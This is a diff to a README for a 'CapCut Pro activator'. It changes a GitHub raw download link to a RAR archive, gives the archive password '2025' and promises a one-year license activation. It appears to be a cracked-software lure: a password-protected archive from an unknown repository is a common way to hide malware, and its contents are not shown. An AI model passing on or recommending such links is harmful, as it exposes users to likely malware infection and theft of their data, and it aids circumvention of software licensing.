@@ -1,6 +1,6 @@
 # <h1 align="center">CapCut Pro activator</h1>
 
-# [DOWNLOAD](https://github.com/SreesanthVS/Capcut-pro-activator-/raw/refs/heads/main/Pro%20Activator.rar)
+# [DOWNLOAD](https://github.com/SreesanthVS/Capcut-pro-activator-/raw/refs/heads/main/CapCut.rar)
 # Archive password: 2025
 
 One year license activation
